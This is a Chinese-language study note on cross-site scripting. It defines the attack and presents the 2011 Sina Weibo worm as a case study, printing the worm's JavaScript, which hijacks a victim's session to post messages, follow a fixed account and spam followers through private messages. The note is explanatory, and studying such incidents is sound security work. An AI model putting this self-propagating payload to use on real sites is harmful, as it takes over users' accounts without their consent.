# xss攻击

跨站脚本，Cross-site scripting

定义：通常指利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序的攻击。

语言：程序语言通常是JavaScript，也可以包括Java、VBScript、ActiveX、Flash、HTML。

意义：攻击成功后可以得到更高的权限、私密内容、会话、cookie等内容。

攻击排名：2nd。代码注入1st。



## 例子1：新浪微博病毒事件

![img](http://photocdn.sohu.com/20110628/Img311946834.jpg)

攻击代码如下：

![img](http://photocdn.sohu.com/20110628/Img311947166.jpg)

```
//发微博
function publish(){
    url = 'http://weibo.com/mblog/publish.php?rnd=' + new Data().getTime();
    data = 'content=' + random_msg() + '&pic=&styleid=2&retcode=';
    post(url, data, true);
}
//加关注
function follow(){
    url = 'http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&atnId=profile&rnd=' + new Date().getTime();
    data = 'uid=' + 2201270010 + '&fromuid=' + $CONFIG.$uid + '&refer_sort=profile&atnId=profile';
    post(url,data,true);
}
//给粉丝发私信
function message(){
    url='http://weibo.com' + $CONFIG.$uid + '/follow';
    ids = getappkey(url);
    id = ids.split('||');
    for(i=0; i < id.length - 1 & i<5; i++){
      msgurl = 'http://weibo.com/message/addmsg.php?rnd=' + new Data().getTime();
      msg = random_msg();
      msg = encodeURIComponent(msg);
      user = encodeURIComponent(encodeURIComponent(id[i]));
      data = 'content=' + msg + '&name=' + user + '&retcode=';
      post(msgurl, data, false);
    }
}
```

攻击者在微博内容的短链接指向的真实链接中嵌入了一段JavaScript代码，用此发动了攻击。

技术人员表示这是由于在生成短链接的时候未能严格校验script标签造成的。而script是由新浪本域的url链接引到的，所以可以在本域执行，直接模拟用户的各种请求。

（新浪微博中毒事件转载自http://it.sohu.com/20110628/n311945225.shtml）